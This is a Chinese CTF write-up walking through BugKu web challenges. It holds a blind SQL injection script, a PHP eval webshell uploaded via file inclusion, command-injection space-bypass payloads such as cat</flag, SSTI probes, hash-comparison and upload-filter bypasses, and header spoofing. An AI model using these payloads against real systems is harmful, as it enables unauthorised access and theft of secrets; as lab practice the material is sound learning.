---
title: WP-BugKu-Web
toc: true
date: 2021-05-08 11:43:54
tags: [CTF, WriteUp]
categories: [100 Cyber security, 120 CTF, 121 Web ]
---

#### Web 18
提示：题目刷新几次后有提示，需要计算数值并post value。

*  考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。
    ```
import requests
from bs4 import BeautifulSoup

url = 'http://114.67.246.176:14925/'
s = requests.session()
r = s.get(url)
r.encoding = 'utf-8'
soup=BeautifulSoup(r.text,'lxml')
data=soup.select('div')
for item in data:
    #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514=?;
    result=item.get_text()

result1=result[0:len(result)-3] #去掉后三位‘=?;’
result2 = eval(result1) #计算数值
result3={'value':result2} #添加post请求数据格式

mssg=s.post(url, data=result3) #利用同一个session，防止网页刷新。

print(mssg.text)
    ```

#### Web 19
提示： OK ,now you have to post the margin what you find

* 解题思路：刷新几次之后没有发现变化，f12看network请求，在response包header内看到base64加密的flag，解码后为‘跑的还不错，给你flag吧: MjE0Nzg1’，一开始并没有意识到后面是base64的密文，直到一次运行爬虫发现密文有=号结尾。根据其他人的解读，说margin是数字所以提示了有两次base64解密，完全没有意识到这一层，我只猜到了post数据时数据格式为{‘margin’:xxx}，不得不说这提示的语法不太行，应该删掉what，这个着实困扰了。
    这个解开之后就简单很多了，另一个难点是在py3里string无法直接用base64解密，需要先转换成ascii。以及解密之后的返回值为bytes，需要转换成utf-8格式再进行后续删减处理，不然有`b’‘`等噪音。
    ```
    import base64
    import requests

    url='http://114.67.246.176:19877/'
    s=requests.session()

    r=s.get(url).headers.get('flag')
    r1=base64.b64decode(r.encode('ascii'))
    r2=r1.decode("utf-8")
    r3=r2[len(r2)-8:len(r2)]
    r4=base64.b64decode(r3.encode('ascii')).decode("utf-8")

    print(s.post(url, data={'margin':r4}).text)
    ```

#### Web 23
题目：
```
<?php
highlight_file('2.php');
$key='flag{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){
 die('key is: '.$key);
}
?>
```

* 解题思路：基本上难点都在这句正则上了，外加一个trim()去掉输入值前后的空白字符。解读一下php语句，就是当id的输入值符合正则时，退出（die）并返回key。2.php在此处仅为含有该php语句的文件（highlight_file），与输入值无关。跟着这道题试验了好几个找到的在线正则工具，发现还是regex101好用。
  `/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i`，`{4,7}`表示重复前面部分4～7次，`[:punct:]`为所有的特殊字符。
  payload：`keykeykkeykey:/k/keya[:punct:]`

#### Web 24
题目：
```
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

* 解题思路：似曾相识的MD5相等题，此次应掏出MD5绕过笔记。strcmp(str1,str2),如果str1小于str2返回<0；如果str1大于str2返回>0；如果两者相等，返回0。因为是if(!xxx)返回flag，所以v3和flag相等。搜索strcmp绕过，可知当传入的类型非期望类型时，即传入值非string时，发生错误，返回0。如：数组,`?a[]=2`

#### Web 25
提示：SQL约束攻击

* 解题思路：点开链接，发现是一个后台登录站点，先放着不管，查一下提示给的SQL约束攻击。内容也算似曾相识，之前在bug bounty的hint里面见过，也就是利用用户名长度限制，在用户名最后加上多个空白字符以及末尾一个用于绕过用户名是否已注册的对比的任意字符，那么在存储时，数据库仅存储前X位字符，导致攻击者可以取代登录目标用户。ref：https://www.freebuf.com/articles/web/124537.html
  知道了就简单了，思路是先盲猜管理员用户名，然后通过SQL约束攻击注册新帐号，取代替换原管理员帐号的密码。

#### Web 26
提示：are you from google?

* 解题思路：这个提示已经很明显了，直接包头加转发（referer），表示自己是从google来的就行。突然在想x-forwarded-for为啥不行，查了一下XFF必须是IP地址。

#### Web 27
提示：
    1. please input a
    2. md5 collision

* 解题思路：MD5碰撞，题面只有一句please input a，盲猜是输入a和某个值碰撞，那么首先试试输入数组报错法，回显`false!!`，起码证明思路应该是对的，重新查了查MD5碰撞，猜测题目是强类型不能绕过。但不知道另一个对比值要怎么做真实碰撞呢？
  好家伙，看了看提示，发现是没给对比值源码。。。行8

#### Web 28
提示：请从本地访问。

* 解题思路：好的看到本地访问又稳了，直接开链接搞XFF。题目不但似曾相识还莫名的变简单了。。。
  我一般是上burp，不过在评论里看到一个`curl -H "X-Forwarded-For: 127.0.0.1" http://114.67.246.176:18832/`，码住。

#### Web 29
题目：
```
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
   if ($_GET['uname'] == $_POST['passwd'])

       print 'passwd can not be uname.';

   else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

       die('Flag: '.$flag);
   else
       print 'sorry!';

}
?>
```

* 解题思路：`urldecode，解码给出的已编码字符串中的任何%##，加号（'+'）被解码成一个空格字符。`看题目是个sha1绕过，查了一下和MD5绕过差不多，弱类型可以用数组，强类型可以用碰撞结果相同的值（`sha1(str) sha1('aaroZmOk') sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m')`）。

#### Web 30
题目：
```
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

* 解题思路：`extract — 从数组中将变量导入到当前的符号表。`不是很熟练，看了评论，是导入站点的文件并且和get输入变量对比。另一个思路file_get_contents绕过。所以有两种方式，一种是利用站点文件flag.txt，输入`?fn=flag.txt&ac=bugku`，另一种是`?ac=bug&fn=php://input`，post数据`bug`。

#### Web 31
提示：好像需要管理员

* 解题思路：一打开是个404,最下面是`Generated by kangle/3.5.5.` ，结合提示需要管理员，那就先从这个入手找找漏洞。搜了一下，控制面板管理员后台3312/admin，但是分发的虚拟机也不太能这么找后台。上sourceleakhacker扫一下，robots.txt爆出一个路径`Disallow: /resusl.php`，访问，提示`Warning:你不是管理员你的IP已经被记录到日志了`以及`if ($_GET[x]==$password) 此处省略1w字`，也就是XFF127.0.0.1并发送password，结合kangle的弱口令admin/admin，得到flag。这里发送包有XFF但password不对时显示的IP地址还是我本地址而不是127.0.0.1,差点又以为思路错了。

#### Web 32
题目：文件上传;My name is margin,give me a image file not a php

* 解题思路：文件上传漏洞，掏出上传fuzz试试看。
  fuzz没过，看评论说是把multipart/form-data;修改成Content-Type: mulTipart/form-data; ，然后修改php文件为php4，竟然还有这种操作，学到了。

#### Web 33
提示：
```
Flag:{xxx}
fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=
 // 本人按：解密为}l.&W'EG*B(W[(+G'U-0，但这个并不是看起来的20位长度，而是算上不可见字符的38位长。所以碰到这种还是应该直接写代码而不是粘贴密文，以防万一。
```
题目：
```
<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) {
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?>
```

* 解题思路：在线解base64的时候还没注意到，复制下来才发现还有特殊字符。`.=连接赋值运算符，将右边参数附加到左边的参数之后。`完整的看了一遍代码，发现应该是如何计算出提示中base64字符串的算法。懒得配环境，对PHP一直是只会读代码不会写应用的状态，干脆在网上找了找PHP在线运行网站`www.anycodes.cn`。试着运行了一下原算法，用不同的数字和字母输入data内容，观察运行。
然后根据提示中的base64推断可得data长度。
逆推写了一下获取data的源码：
```
<?php
$str='fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=';
$str_decode = base64_decode($str);
$len1=strlen($str_decode);

$key = md5('ISCC');  # 729623334f0aa2784a1599fd374c120d
$klen = strlen($key);
$char = '';
$data = '';
for ($i=0; $i < $len1; $i++) {
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x]; # 729623334f0aa2784a1599fd374c120d729623
        $x+=1;
    }
# print($len1); -> 38
# print($char); -> 729623334f0aa2784a1599fd374c120d729623
for ($i=0; $i < $len1; $i++) {
        $data .= chr((ord($str_decode[$i])+128)-ord($char[$i]));
    }
print($data);    
?>
```
得到结果：lag{asdqwdf[此次哔-]adwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag{asdqwdf[此次哔-]adwqadawd}，结果正确。
* 总结： 难点主要在一开始完整的阅读代码理解意思，并且顺利的逆推`$str .= chr((ord($data[$i]) + ord($char[$i])) % 128);`这句代码。关于这句代码我自己写了写逆推笔记，记录整理如下：
```
ord($di)+ord($ci) = A #简化原代码，$di=$data[$i],$ci=$char[$i],$str1=$str[$i].
$str1 = chr((ord($di)+ord($ci)) % 128) #chr和ord为互补，所以从右边拿到左边就变成ord。
ord($str1)=(ord($di)+ord($ci)) % 128 #在这里简化一下得到下面。
ord($str1)=(A) % 128
ord($str1)+128=(A) #这里有一点直觉的成分，因为ord得出的值范围在0～255之间，而A为两个ord相加，所以数值范围应该在0～510,也就是A mod 128的结果在0～127之间。无法确定到底A净除了几个128的情况下，我选择先加一个128,看一下到底能不能运行。（后续发现获得$di还是要经过一个chr，所以A到底多了几个128好像没啥影响）
ord($di) = A-ord($ci) #从最后产出的base64密文解密可得data的长度，而char的内容只和md5('ISCC')和data长度有关，所以可以知道char的内容。
$di = chr(A-ord($ci)) #这里可以把原本简化的A用原内容代替回来了。
$di = chr((ord($str1)+128)-ord($ci)) #思路就是这样，然后根据这个写代码。
```

#### Web 34
提示：文件包含

* 解题思路：既然是文件包含，一开始上来就先试试file=php://input(<?php phpinfo();?>)，提示NAIVE，不管，反正方向是对了，开burp传包才看到这个页面有个隐藏的upload.php，点进去发现是个上传点。结合apache的版本和PHP版本，没啥直接上传shell利用的机会。那就只能上传成jpg的格式，然后用文件包含去利用。http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg，打开之后发现提示`_ @eval($_POST['shell']);_`，显然是过滤了<?php?>，换成<script>。`<script language=php>echo 'a'; eval($_POST['pass']);</script>`
这题不错，把我一直以来没有联合使用的两种手法彻底试了试。

#### Web 35
提示：login按钮无法按

* 解题思路：login按钮倒是不难解决。代码里加个`type="submit"`。post完数据之后跳转回来没有啥反应，查看源码内的CSS文件，其中有写了try?32758。`POST /?32758 `之后返回源码:
```
<?php
error_reporting(0);
$KEY='ctf.bugku.com';
include_once("flag.php");
$cookie = $_COOKIE['BUGKU'];
if(isset($_GET['32758'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
else {
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<link rel="stylesheet" href="admin.css" type="text/css">
</head>
<body>
<br>
<div class="container" align="center">
  <form method="POST" action="#">
    <p><input name="user" type="text" placeholder="Username"></p>
    <p><input name="password" type="password" placeholder="Password"></p>
    <p><input value="Login" type="button"/></p>
  </form>
</div>
</body>
</html>

<?php
}
?>
```
这里的关键点是`unserialize($cookie) === "$KEY"`，利用在线PHP，`$a=serialize('ctf.bugku.com')`，得到`s:13:"ctf.bugku.com";`，在bp里添加cookie，得到flag。

#### Web 36
提示： !,!=,=,+,-,^,%
      全都过滤了绝望吗？

* 解题思路：先跑bp看看关键词屏蔽情况，or和空格过滤了，--也过滤了，替代or的||也未曾幸免,()没有过滤。参考提示，!,!=,=,+,-,^,% （构造的url转码注入）没有被过滤，那么用+替代空格，利用！=构造用户名注入，`amdin'+‘1’！=‘2`，返回`password error`，也就是说这个绕过成功但没有注释掉密码。
这里照抄WP的盲注：ref https://wxt123.top/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/#Web-36
```
# -*- coding: utf-8 -*-
import requests

session = requests.Session()
url="http://114.67.246.176:12012/login.php"
flag=''
for i in range(1,250):
        left=32
        right=128
        mid=(left+right)//2
        while(left<right):
                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))>%s))^'1"%(i,mid)
                data = {'uname': payload, 'passwd': 'admin'}
                res = requests.post(url, data=data)
                if 'password' in res.text:
                        left=mid+1
                else:
                        right=mid
                mid=(left+right)//2
        if(mid==32 or mid==127):
                break
        flag=flag+chr(mid)
        print(flag)
```
进去之后是个命令执行框，这里要怒翻文件包含里记下的笔记，利用<代替空格，cat</flag，（加.php会被过滤）
再记几个可以用的方式：
    * env :用于输出系统环境变量，这道题中系统环境变量中有flag；
    * {echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量
    * {cat,/flag}：绕过空格限制，读取根目录下flag文件；
    * cat</flag：绕过空格限制，
    * cat<>/flag：绕过空格限制；
    * `a=$‘\x20/flag’&&cat$a`：\x20转换为字符串就是空格;
再做个关于fuzz后台登录密码的注入笔记：
    * 判断密码长度：uname=admin'^(length(passwd)=32)^'，逐一递增，并根据32位猜测密码为MD5。
    * 判断密码每一位字符：uname=admin'^(ascii(substr((passwd)from(1))=52)^'

#### Web 37
提示：union,命令执行
* 解题思路：
(做了两个月crypto回来发现web题没有了好多？)

#### Simple_SSTI_1
* 解题思路：速查SSTI是什么。`SSTI 即服务端模板注入攻击，服务端接受用户输入，将其作为 Web 应用模板的一部分，渲染编译后执行了恶意内容，导致敏感信息泄露、代码执行等。`
差不多看懂了，F12看一眼页面源码，源码里有提示 `<!-- You know, in the flask, We often set a secret_key variable.-->`。
这里执行IP/?flag={{2*2}}可以执行，证明有渲染漏洞。按照提示，用config查看SECRET_KEY值。（/?flag={{config['SECRET_KEY']}}）

#### Simple_SSTI_2
* 解题思路：这个源码没提示了，那就先试试上一道题的吧。
flag={{2*2}}依然能执行，漏洞还在这里。
收集到了专门的工具：tplmap，相当好用。

#### Flask_FileUpload
* 解题思路：这个考点还挺多，一个是上传绕过（py在黑名单里但是py3不在），然后是上传py文件让服务器执行并返回想要的内容(os.system('ls'))。以及如何用python获取上一级目录内文件（os.system('cat ../flag')）。

#### game1
* 解题思路：把发出去的包头两个传送分数的值（score sign）改一下就可以了，刚入门的时候做过这道题，那时候居然没发现是base64这里有加了个zm，还是年轻。

#### 社工_伪造
* 解题思路：登录的帐号会共享QQ的头像ID，通过小美签名找到男朋友QQ，拿到头像，手动改自己QQ的头像，ID似乎不需要改（不过我改了），这题真好玩。
以及有勇士尝试了能不能直接改包，看来是不行。
（如果直接用男朋友QQ登录，会提示：你可真是个小天才）

#### source
* 解题思路：source标题提示，F12看一眼页面源码，有加密的flag（不是单纯的B64），另一个提示是tig，其实是暗示了git文件泄漏。上脚本查泄漏，git reflog恢复commit记录，git show [commit_id]看修改内容。
